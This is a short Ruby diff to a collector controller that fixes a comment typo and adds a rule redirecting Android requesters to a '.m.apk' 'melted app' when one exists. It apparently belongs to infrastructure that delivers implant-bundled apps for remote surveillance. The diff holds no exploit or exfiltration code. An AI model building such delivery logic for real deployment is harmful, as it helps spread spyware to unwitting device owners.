@@ -111,9 +111,17 @@ class CollectorController < RESTController
 
     # if the file is not present
     unless File.file?(file_path)
-      # appent the extension for the arch of the requester
+      # append the extension for the arch of the requester
       arch_specific_file = uri + ext
 
+      # special case for android melted app
+      if os.eql? 'android' and File.exist?(file_path + ".m.apk")
+        arch_specific_file = uri + ".m.apk"
+        trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
+        return http_redirect arch_specific_file
+      end
+
+      # all the other OSes
       if File.file?(file_path + ext)
         trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
         return http_redirect arch_specific_file
